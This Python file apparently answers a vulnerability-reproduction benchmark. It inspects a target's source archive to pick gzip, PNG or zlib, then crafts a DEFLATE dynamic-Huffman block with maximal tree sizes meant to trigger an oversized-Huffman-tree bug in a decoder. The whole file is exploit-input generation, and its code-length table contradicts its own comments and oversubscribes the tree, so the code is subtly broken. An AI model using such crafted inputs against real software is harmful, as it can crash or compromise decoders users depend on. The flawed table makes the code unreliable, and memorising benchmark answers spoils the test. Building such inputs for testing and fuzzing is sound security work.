import tarfile
import binascii
import struct


class BitWriter:
    def __init__(self):
        self.bytes = bytearray()
        self.bitbuf = 0
        self.bitcount = 0

    def write_bits(self, value, nbits):
        # append nbits of value, least-significant bit first
        for i in range(nbits):
            bit = (value >> i) & 1
            self.bitbuf |= bit << self.bitcount
            self.bitcount += 1
            if self.bitcount == 8:
                self.bytes.append(self.bitbuf & 0xFF)
                self.bitbuf = 0
                self.bitcount = 0

    def flush(self):
        if self.bitcount:
            self.bytes.append(self.bitbuf & 0xFF)
            self.bitbuf = 0
            self.bitcount = 0


class Solution:
    def solve(self, src_path: str) -> bytes:
        container = self._detect_container(src_path)
        deflate_data = self._build_deflate_trigger()

        if container == "png":
            zlib_stream = self._build_zlib_stream(deflate_data)
            return self._build_png(zlib_stream)
        elif container == "gzip":
            return self._build_gzip_stream(deflate_data)
        else:  # "zlib"
            return self._build_zlib_stream(deflate_data)

    def _detect_container(self, src_path: str) -> str:
        # Heuristically detect whether the binary expects gzip, PNG, or raw zlib.
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return "zlib"

        main_text = ""
        all_text = ""

        try:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                if not name.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read().decode("latin1", "ignore")
                except Exception:
                    continue
                all_text += "\n" + data
                if "int main" in data:
                    main_text += "\n" + data
        finally:
            tf.close()

        text_main = main_text.lower()
        text_all = all_text.lower()

        # Prefer classification based on main(), fall back to whole project.
        if "gzip" in text_main or "gunzip" in text_main or ".gz" in text_main:
            return "gzip"
        if ("ihdr" in main_text or "idat" in main_text or "iend" in main_text or
                "upng_new_from_file" in main_text or "upng_new_from_bytes" in main_text):
            return "png"

        if "gzip" in text_all or "gunzip" in text_all or ".gz" in text_all:
            return "gzip"
        if ("ihdr" in text_all or "idat" in text_all or "iend" in text_all or
                "upng_new_from_file" in text_all or "upng_new_from_bytes" in text_all):
            return "png"

        # Default: zlib stream
        return "zlib"

    def _build_deflate_trigger(self) -> bytes:
        """
        Build a single dynamic Huffman block that:
        - Uses maximum HLIT/HDIST/HCLEN to trigger oversized Huffman trees
        - Contains only an end-of-block marker as data
        - Is otherwise valid according to DEFLATE, to avoid crashing the fixed binary
        """
        bw = BitWriter()

        # BFINAL=1 (last block), BTYPE=2 (dynamic Huffman)
        bw.write_bits(1, 1)   # BFINAL
        bw.write_bits(2, 2)   # BTYPE = 2 (10b)

        # Use maximum values to force large Huffman trees.
        HLIT = 31   # HLIT + 257 = 288 literal/length codes
        HDIST = 31  # HDIST + 1  = 32 distance codes
        HCLEN = 15  # HCLEN + 4  = 19 code length codes

        bw.write_bits(HLIT, 5)
        bw.write_bits(HDIST, 5)
        bw.write_bits(HCLEN, 4)

        # Code length code lengths (for 19 codes, in the DEFLATE-specified order):
        # Order of code length codes: 16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15
        # We define a simple, complete tree with two symbols of length 1 (0 and 1),
        # rest zero. These correspond to code length symbols 0 and 1.
        # Positions: symbol 0 is at index 3, symbol 1 is at index 17.
        cl_lens_by_order = [
            0,  # 16
            0,  # 17
            0,  # 18
            1,  # 0
            0,  # 8
            0,  # 7
            0,  # 9
            0,  # 6
            0,  # 10
            0,  # 5
            0,  # 11
            0,  # 4
            0,  # 12
            0,  # 3
            0,  # 13
            0,  # 2
            1,  # 14 -> actually symbol 1 is at index 17 (order[17] == 1)
            0,  # 1
            0,  # 15
        ]
        # Fix index 17 to have length 1 (symbol 1)
        cl_lens_by_order[17] = 1

        for bl in cl_lens_by_order:
            bw.write_bits(bl, 3)  # 3 bits per code length

        # Now encode the literal/length and distance code lengths using the above
        # code length alphabet. We only use symbols 0 and 1, which have 1-bit
        # codes '0' and '1' respectively, and mean:
        #   symbol 0 -> length 0
        #   symbol 1 -> length 1
        #
        # Literal/length codes: 257 + HLIT = 288 entries
        # We choose a complete-but-minimal tree:
        #   length[0]   = 1  (some unused literal)
        #   length[256] = 1  (EOB)
        #   all others  = 0
        total_ll = 257 + HLIT  # 288
        for i in range(total_ll):
            if i == 0 or i == 256:
                bw.write_bits(1, 1)  # length 1
            else:
                bw.write_bits(0, 1)  # length 0

        # Distance codes: 1 + HDIST = 32 entries
        # Make a similar simple complete tree:
        #   length[0] = 1
        #   length[1] = 1
        #   others    = 0
        total_d = 1 + HDIST  # 32
        for j in range(total_d):
            if j == 0 or j == 1:
                bw.write_bits(1, 1)  # length 1
            else:
                bw.write_bits(0, 1)  # length 0

        # Data section: use the literal/length tree.
        # With our choices, the lit/len Huffman codes are:
        #   symbol 0   -> code '0'
        #   symbol 256 -> code '1'
        #
        # We want only an end-of-block, so emit symbol 256 with code '1'.
        bw.write_bits(1, 1)  # EOB

        # Flush any remaining bits to whole bytes.
        bw.flush()
        return bytes(bw.bytes)

    def _build_zlib_stream(self, deflate_data: bytes) -> bytes:
        # Zlib header: CMF=0x78 (deflate, 32K window), FLG=0x9C (FCHECK set so that (CMF<<8|FLG)%31==0)
        header = b"\x78\x9c"
        # Adler-32 of empty uncompressed data is 1
        adler = 1
        return header + deflate_data + struct.pack(">I", adler)

    def _build_gzip_stream(self, deflate_data: bytes) -> bytes:
        # Minimal gzip header:
        # ID1=0x1f, ID2=0x8b, CM=8 (deflate), FLG=0 (no extras),
        # MTIME=0, XFL=0, OS=255 (unknown)
        header = b"\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff"
        # CRC32 and ISIZE for empty uncompressed data
        crc32 = 0
        isize = 0
        footer = struct.pack("<II", crc32, isize)
        return header + deflate_data + footer

    def _build_png(self, zlib_stream: bytes) -> bytes:
        sig = b"\x89PNG\r\n\x1a\n"

        # IHDR chunk
        width = 1
        height = 1
        bit_depth = 8
        color_type = 0       # grayscale
        compression = 0
        filter_method = 0
        interlace = 0
        ihdr_data = struct.pack(">IIBBBBB", width, height,
                                bit_depth, color_type,
                                compression, filter_method, interlace)
        ihdr_type = b"IHDR"
        ihdr_len = struct.pack(">I", len(ihdr_data))
        ihdr_crc = struct.pack(">I", binascii.crc32(ihdr_type + ihdr_data) & 0xFFFFFFFF)

        # IDAT chunk with our zlib stream
        idat_type = b"IDAT"
        idat_data = zlib_stream
        idat_len = struct.pack(">I", len(idat_data))
        idat_crc = struct.pack(">I", binascii.crc32(idat_type + idat_data) & 0xFFFFFFFF)

        # IEND chunk
        iend_type = b"IEND"
        iend_data = b""
        iend_len = struct.pack(">I", 0)
        iend_crc = struct.pack(">I", binascii.crc32(iend_type + iend_data) & 0xFFFFFFFF)

        return b"".join([
            sig,
            ihdr_len, ihdr_type, ihdr_data, ihdr_crc,
            idat_len, idat_type, idat_data, idat_crc,
            iend_len, iend_type, iend_data, iend_crc,
        ])